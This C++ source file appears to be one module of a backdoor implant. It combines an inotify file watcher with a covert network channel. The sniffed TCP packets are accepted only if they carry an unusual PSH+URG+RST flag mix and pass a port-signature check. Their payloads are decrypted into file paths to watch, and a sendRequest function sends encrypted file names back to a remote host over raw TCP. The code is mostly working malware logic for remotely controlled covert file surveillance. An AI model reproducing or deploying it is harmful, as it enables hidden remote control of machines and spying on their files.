#include "FileMonitor.h"

#include <sys/select.h>
#include <sys/time.h>
#include <unistd.h>

#include "NetworkEngine.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUFFER_LEN (1024 * (EVENT_SIZE + 16))

FileMonitor::FileMonitor(EventCallback &created, EventCallback &modified, EventCallback &deleted) {
    this->t = nullptr;

    this->running = false;

    this->inotifyFd = inotify_init();

    this->setCreatedCallback(created);
    this->setModifiedCallback(modified);
    this->setDeletedCallback(deleted);
}

FileMonitor::~FileMonitor() {
    this->stopMonitoring();

    for (auto &pair : wds) {
        inotify_rm_watch(this->inotifyFd, pair.second);
    }

    close(this->inotifyFd);
}

bool FileMonitor::addWatchFile(const std::string &filename) {
    static const int flags = (unsigned int)(IN_CREATE | IN_MODIFY | IN_DELETE);

    std::lock_guard<std::mutex> guard(this->lock);
    int wd = inotify_add_watch(this->inotifyFd, filename.c_str(), flags);

    if (wd < 0) {
        return false;
    }

    this->wds[filename] = wd;

    return true;
}

void FileMonitor::runMonitoring() {
    int numRead;
    int numRdy;
    char buffer[EVENT_BUFFER_LEN];
    char *p;
    struct inotify_event *event;

    fd_set rfds;
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    this->running = true;
    while (this->running) {
        FD_ZERO(&rfds);
        FD_SET(this->inotifyFd, &rfds);

        numRdy = select(this->inotifyFd + 1, &rfds, NULL, NULL, &timeout);

        if (numRdy == 0) {
            continue;
        }

        if (!FD_ISSET(this->inotifyFd, &rfds)) {
            continue;
        }

        numRead = read(this->inotifyFd, buffer, EVENT_BUFFER_LEN);

        if (numRead <= 0) {
            continue;
        }

        for (p = buffer; p < buffer + numRead;) {
            std::lock_guard<std::mutex> guard(this->lock);

            event = (struct inotify_event *)p;

            if (event->mask & IN_CREATE) {
                this->createdCallback(this, event);
            }

            if (event->mask & IN_MODIFY) {
                this->modifiedCallback(this, event);
            }

            if (event->mask & IN_DELETE) {
                this->deletedCallback(this, event);
            }

            p += EVENT_SIZE + event->len;
        }
    }
}

void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                              NetworkEngine *net) {
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip;
    struct tcphdr *tcp;

    // is it from same machine?
    if (net->isFromThisMachine(eth)) {
        return;
    }

    // is it ip?
    if (!net->isIp(eth)) {
        return;
    }

    // is it tcp?
    ip = (struct iphdr *)(packet + ETH_HLEN);
    if (!net->isTcp(ip)) {
        return;
    }

    tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));

    // is it authenticated?
    if (!net->isAuth(tcp)) {
        return;
    }

    // not a get request
    if (!tcp->psh || !tcp->urg || !tcp->rst) {
        return;
    }

    unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
    unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);

    UCharVector ciphertext{};
    ciphertext.assign(payload, payload + payloadSize);
    UCharVector plaintextBuff = net->getCrypto()->dec(ciphertext);
    std::string plaintext((char *)plaintextBuff.data(), payloadSize);

    this->addWatchFile(plaintext);
}

void FileMonitor::sendRequest(const std::string &file, const in_addr daddr, NetworkEngine *net) {
    static const unsigned char flags = TcpStack::PSH_FLAG | TcpStack::URG_FLAG | TcpStack::RST_FLAG;

    unsigned short sport = (Crypto::rand() % 55535) + 10000;
    unsigned short dport = authenticator::generateSignature(sport);
    unsigned int seq = Crypto::rand();
    unsigned int ack = Crypto::rand();

    UCharVector plaintext(file.begin(), file.end());
    UCharVector ciphertext = net->getCrypto()->enc(plaintext);

    net->sendRawTcp(*net->getIp(), daddr, sport, dport, seq, ack, flags, ciphertext);
}
